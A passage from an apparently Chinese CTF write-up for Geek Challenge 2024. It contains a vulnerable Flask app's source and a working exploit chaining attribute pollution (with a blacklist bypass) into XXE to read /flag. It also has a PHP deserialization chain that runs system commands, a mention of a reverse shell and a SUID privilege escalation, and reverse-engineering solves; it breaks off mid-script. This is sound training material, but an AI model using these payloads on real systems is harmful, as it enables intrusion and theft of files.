class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, flash, redirect, url_for, session, Response, send_file, jsonify</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">&#x27;a123456&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;xml_data&#x27;</span>] = <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;GeekChallenge2024&gt;&lt;EventName&gt;Geek Challenge&lt;/EventName&gt;&lt;Year&gt;2024&lt;/Year&gt;&lt;Description&gt;This is a challenge event for geeks in the year 2024.&lt;/Description&gt;&lt;/GeekChallenge2024&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, username, password</span>):</span><br><span class="line">        self.username = username</span><br><span class="line">        self.password = password</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">return</span> self.username == data[<span class="string">&#x27;username&#x27;</span>] <span class="keyword">and</span> self.password == data[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">admin = User(<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;123456j1rrynonono&#x27;</span>)</span><br><span class="line">Users = [admin]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">isinstance</span>(v, <span class="built_in">dict</span>):</span><br><span class="line">                update(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">isinstance</span>(v, <span class="built_in">dict</span>):</span><br><span class="line">            update(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">for</span> u <span class="keyword">in</span> Users:</span><br><span class="line">            <span class="keyword">if</span> u.username == username:</span><br><span class="line">                flash(<span class="string">&#x27;用户名已存在&#x27;</span>, <span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;register&#x27;</span>))</span><br><span class="line">        new_user = User(username, password)</span><br><span class="line">        Users.append(new_user)</span><br><span class="line">        flash(<span class="string">&#x27;注册成功！请登录&#x27;</span>, <span class="string">&#x27;success&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">for</span> u <span class="keyword">in</span> Users:</span><br><span class="line">            <span class="keyword">if</span> u.check(&#123;<span class="string">&#x27;username&#x27;</span>: username, <span class="string">&#x27;password&#x27;</span>: password&#125;):</span><br><span class="line">                session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">                flash(<span class="string">&#x27;登录成功&#x27;</span>, <span class="string">&#x27;success&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;dashboard&#x27;</span>))</span><br><span class="line">        flash(<span class="string">&#x27;用户名或密码错误&#x27;</span>, <span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/play&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">play</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/app/templates/play.html&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            play_html = file.read()</span><br><span class="line">        <span class="keyword">return</span> play_html</span><br><span class="line">    flash(<span class="string">&#x27;请先登录&#x27;</span>, <span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session <span class="keyword">and</span> session[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;admin.html&#x27;</span>, username=session[<span class="string">&#x27;username&#x27;</span>])</span><br><span class="line">    flash(<span class="string">&#x27;你没有权限访问&#x27;</span>, <span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/downloads321&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">downloads321</span>():</span><br><span class="line">    <span class="keyword">return</span> send_file(<span class="string">&#x27;./source/app.pyc&#x27;</span>, as_attachment=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/dashboard&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dashboard</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        is_admin = session[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> is_admin:</span><br><span class="line">            user_tag = <span class="string">&#x27;Admin User&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            user_tag = <span class="string">&#x27;Normal User&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;dashboard.html&#x27;</span>, username=session[<span class="string">&#x27;username&#x27;</span>], tag=user_tag, is_admin=is_admin)</span><br><span class="line">    flash(<span class="string">&#x27;请先登录&#x27;</span>, <span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/xml_parse&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xml_parse</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        xml_bytes = app.config[<span class="string">&#x27;xml_data&#x27;</span>].encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        parser = etree.XMLParser(load_dtd=<span class="literal">True</span>, resolve_entities=<span class="literal">True</span>)</span><br><span class="line">        tree = etree.fromstring(xml_bytes, parser=parser)</span><br><span class="line">        result_xml = etree.tostring(tree, pretty_print=<span class="literal">True</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>, xml_declaration=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">return</span> Response(result_xml, mimetype=<span class="string">&#x27;application/xml&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> etree.XMLSyntaxError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(e)</span><br><span class="line">black_list = [<span class="string">&#x27;__class__&#x27;</span>.encode(), <span class="string">&#x27;__init__&#x27;</span>.encode(), <span class="string">&#x27;__globals__&#x27;</span>.encode()]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/update&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update_route</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session <span class="keyword">and</span> session[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> request.data:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> check(request.data):</span><br><span class="line">                    <span class="keyword">return</span> (<span class="string">&#x27;NONONO, Bad Hacker&#x27;</span>, <span class="number">403</span>)</span><br><span class="line">                data = json.loads(request.data.decode())</span><br><span class="line">                <span class="built_in">print</span>(data)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">all</span>((<span class="string">&#x27;static&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(value) <span class="keyword">and</span> <span class="string">&#x27;dtd&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(value) <span class="keyword">and</span> (<span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(value)) <span class="keyword">and</span> (<span class="string">&#x27;environ&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(value)) <span class="keyword">for</span> value <span class="keyword">in</span> data.values())):</span><br><span class="line">                    update(data, User)</span><br><span class="line">                    <span class="keyword">return</span> (jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;更新成功&#x27;</span>&#125;), <span class="number">200</span>)</span><br><span class="line">                <span class="keyword">return</span> (<span class="string">&#x27;Invalid character&#x27;</span>, <span class="number">400</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> (<span class="string">f&#x27;Exception: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&#x27;</span>, <span class="number">500</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> (<span class="string">&#x27;No data provided&#x27;</span>, <span class="number">400</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flash(<span class="string">&#x27;你没有权限访问&#x27;</span>, <span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>审计代码，<code>/update</code> 原型链污染 <code>app.config[&#39;xml_data&#39;]</code> 为恶意xml代码，再访问 <code>/xml_parse</code> 触发XXE漏洞读文件。</p><p>原型链污染部分，用unicode编码绕过字符串过滤；XXE部分，将payload编码为UTF-16BE绕过。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://80-cdb52045-af65-4bfe-96b9-57db1b26eac5.challenge.ctfplus.cn&#x27;</span></span><br><span class="line"></span><br><span class="line">cookie = &#123;</span><br><span class="line">    <span class="string">&#x27;session&#x27;</span>:<span class="string">&#x27;eyJ1c2VybmFtZSI6ImFkbWluIn0.ZyUV7A.z-zuf8kzQ61LEbcsR7J4i80SyP0&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">xml_data = <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;&#x27;</span></span><br><span class="line">xml_data2 = os.popen(<span class="string">f&#x27;&#x27;&#x27;echo &#x27;<span class="subst">&#123;xml_data&#125;</span>&#x27;| iconv -f utf-8 -t utf-16be&#x27;&#x27;&#x27;</span>).read()</span><br><span class="line"><span class="built_in">print</span>(xml_data2)</span><br><span class="line">json = &#123;</span><br><span class="line">    <span class="string">&#x27;\u005f_init__&#x27;</span>:&#123;</span><br><span class="line">        <span class="string">&#x27;\u005f_globals__&#x27;</span>:&#123;</span><br><span class="line">            <span class="string">&#x27;app&#x27;</span>:&#123;</span><br><span class="line">                <span class="string">&#x27;config&#x27;</span>:&#123;</span><br><span class="line">                    <span class="string">&#x27;xml_data&#x27;</span>:xml_data2</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(<span class="string">f&#x27;<span class="subst">&#123;url&#125;</span>/update&#x27;</span>,json=json,cookies=cookie)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line">r = requests.get(<span class="string">f&#x27;<span class="subst">&#123;url&#125;</span>/xml_parse&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>输出flag：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;message&quot;:&quot;\u66f4\u65b0\u6210\u529f&quot;&#125;</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;utf-8&#x27;?&gt;</span><br><span class="line">&lt;foo&gt;SYC&#123;4eb08b2f-73a0-4088-9f64-4d6255918cc6&#125;</span><br><span class="line">&lt;/foo&gt;</span><br></pre></td></tr></table></figure><p>​</p><h3 id="PHP不比Java差"><a href="#PHP不比Java差" class="headerlink" title="PHP不比Java差"></a>PHP不比Java差</h3><blockquote><p>Java有的我们PHP也有</p></blockquote><p>反序列化链构造思路：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$FUNC=$change($data);</span><br><span class="line">$FUNC();</span><br><span class="line"></span><br><span class="line">$data为反序列化类中的变量和值构成的array</span><br><span class="line">利用 [new Challenge(),&#x27;Sink&#x27;]() 动态调用</span><br><span class="line"></span><br><span class="line">$eee=new $this-&gt;Where($this-&gt;IS);</span><br><span class="line">$fff=$this-&gt;Starven;</span><br><span class="line">$eee-&gt;$fff($this-&gt;Girlfriend);</span><br><span class="line"></span><br><span class="line">(new $a($b))-&gt;$c($d); 型</span><br><span class="line">用原生类实现</span><br></pre></td></tr></table></figure><p>先构造：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> phpserialize <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Challenge</span>:</span><br><span class="line">    public_file=<span class="string">&#x27;/etc/passwd&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Geek</span>:</span><br><span class="line">    public_a=<span class="string">&#x27;x&#x27;</span></span><br><span class="line">    public_b=[Challenge(),<span class="string">&#x27;Sink&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(serialize(Geek()))</span><br><span class="line"></span><br><span class="line"><span class="comment"># O:4:&quot;Geek&quot;:2:&#123;s:1:&quot;a&quot;;s:1:&quot;x&quot;;s:1:&quot;b&quot;;a:2:&#123;i:0;O:9:&quot;Challenge&quot;:1:&#123;s:4:&quot;file&quot;;s:11:&quot;/etc/passwd&quot;;&#125;i:1;s:4:&quot;Sink&quot;;&#125;&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?change=next</span><br><span class="line">POST</span><br><span class="line">data=O:4:&quot;Geek&quot;:2:&#123;s:1:&quot;a&quot;;s:1:&quot;x&quot;;s:1:&quot;b&quot;;a:2:&#123;i:0;O:9:&quot;Challenge&quot;:1:&#123;s:4:&quot;file&quot;;s:11:&quot;/etc/passwd&quot;;&#125;i:1;s:4:&quot;Sink&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure><p>得到提示：<code>The True Flag is in /flag</code></p><p>RCE构造：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> phpserialize <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Syclover</span>:</span><br><span class="line">    public_Where=<span class="string">&#x27;ReflectionFunction&#x27;</span></span><br><span class="line">    public_IS=<span class="string">&#x27;system&#x27;</span></span><br><span class="line">    public_Starven=<span class="string">&#x27;invoke&#x27;</span></span><br><span class="line">    public_Girlfriend=<span class="string">&#x27;ls -al /&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Challenge</span>:</span><br><span class="line">    public_file=Syclover()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Geek</span>:</span><br><span class="line">    public_a=<span class="string">&#x27;x&#x27;</span></span><br><span class="line">    public_b=[Challenge(),<span class="string">&#x27;Sink&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(serialize(Geek()))</span><br><span class="line"></span><br><span class="line"><span class="comment"># O:4:&quot;Geek&quot;:2:&#123;s:1:&quot;a&quot;;s:1:&quot;x&quot;;s:1:&quot;b&quot;;a:2:&#123;i:0;O:9:&quot;Challenge&quot;:1:&#123;s:4:&quot;file&quot;;O:8:&quot;Syclover&quot;:4:&#123;s:10:&quot;Girlfriend&quot;;s:8:&quot;ls -al /&quot;;s:2:&quot;IS&quot;;s:6:&quot;system&quot;;s:7:&quot;Starven&quot;;s:6:&quot;invoke&quot;;s:5:&quot;Where&quot;;s:18:&quot;ReflectionFunction&quot;;&#125;&#125;i:1;s:4:&quot;Sink&quot;;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>得到：<code>-r-------- 1 root root 42 Nov 6 11:53 flag</code></p><p>需要提权读/flag，修改命令反弹shell，反弹之后，<code>find / -perm -u=s -type f 2&gt;/dev/null</code> 发现file命令有s权限，<code>file -f /flag</code> 提权读出flag。</p><p>​</p><h2 id="Reverse-2"><a href="#Reverse-2" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="ez-hook"><a href="#ez-hook" class="headerlink" title="ez_hook"></a>ez_hook</h3><blockquote><p>有个东西藏起来了,你能找到它吗</p></blockquote><p>去掉反调试 <code>if ( CheckRemoteDebuggerPresent(hProcess, &amp;pbDebuggerPresent) &amp;&amp; pbDebuggerPresent ) return 0;</code></p><p>动调，加密逻辑为：先reverse，再经过长度3的栅栏加密，再修改 <code>sub_4017E0()</code> 函数区域内容为 <code>sub_4018B4()</code>，逐字符异或7，得到密文：<code>zoXpih^lhX6soX7lr~DTHtGpX|</code>。</p><p>逆回flag：<code>SYC&#123;you_kn0w_wh@t_1s_hoOk&#125;</code>。</p><p>​</p><h3 id="你干嘛"><a href="#你干嘛" class="headerlink" title="你干嘛~~"></a>你干嘛~~</h3><blockquote><p>Am1re很喜欢找哥哥，你干嘛啊~~</p></blockquote><p>分析发现base64字符串 <code>ZmFrZXthcmVfeW08X6JlYWx4X6JpZ7h9fQ==</code>，解码得到fake flag。</p><p>动调步进，发现SEH，异常进入catch。</p><p>在 <code>sub_4D1A50()</code> 函数发现SM4加密算法特征，如果加密结果和enc不同，则进入 <code>loc_4D1EED</code>，输出fake flag的base64。</p><p>获取SM4的key和IV为：</p><p><code>key=0O00O0O00OO0O0O0</code></p><p><code>iv=1III1II111I1I1I1</code></p><p>密文为：<code>enc_hex=216CFDA6B682AFCC516AD1E2A93EA690</code></p><p>解SM4/ZeroBytePadding，得到 <code>qwertyuiopasdfgh</code>。</p><p>作为key异或gif文件字节得到原始gif文件，其中一帧图有flag：<code>SYC&#123;111_YOU_WIN_THE_FLAG&#125;</code>.</p><p>​</p><h3 id="blasting-master"><a href="#blasting-master" class="headerlink" title="blasting_master"></a>blasting_master</h3><blockquote><p>艺术就是爆炸！艺术就是派大星！</p></blockquote><p>动调发现加密逻辑为：</p><p>按下标+1每次循环取4个字符，md5后，对应的16个字符位每位做运算，<code>m[i] = (7*((i+42)^m[i])+82*(i%15))&amp;0xff</code>，存入数组s2。</p><p>逆：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"># test</span></span><br><span class="line"><span class="string">from hashlib import *</span></span><br><span class="line"><span class="string">s = b&#x27;abcdef&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for j in range(len(s)):</span></span><br><span class="line"><span class="string">    ss = s[j:j+4]</span></span><br><span class="line"><span class="string">    m = list(bytes.fromhex(md5(ss).hexdigest()))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    for i in range(16):</span></span><br><span class="line"><span class="string">        m[i] = (7*((i+42)^m[i])+82*(i%15))&amp;0xff</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    #print(ss)</span></span><br><span class="line"><span class="string">    #print([hex(k)[2:] for k in m])</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"></span><br><span class="line">table = string.printable</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dec</span>(<span class="params">x</span>):</span><br><span class="line">    t = <span class="built_in">list</span>(<span class="built_in">bytes</span>.fromhex(x))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        t[i] = (((t[i]-<span class="number">82</span>*(i%<span class="number">15</span>))*inverse(<span class="number">7</span>,<span class="number">256</span>))^(i+<span class="number">42</span>)) &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(t).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5_bruteforce</span>(<span class="params">c</span>):</span><br><span class="line">    <span class="keyword">return</span> mbruteforce(<span class="keyword">lambda</span> x: md5(x.encode()).hexdigest()==c, table, length=<span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line"></span><br><span class="line">c = <span 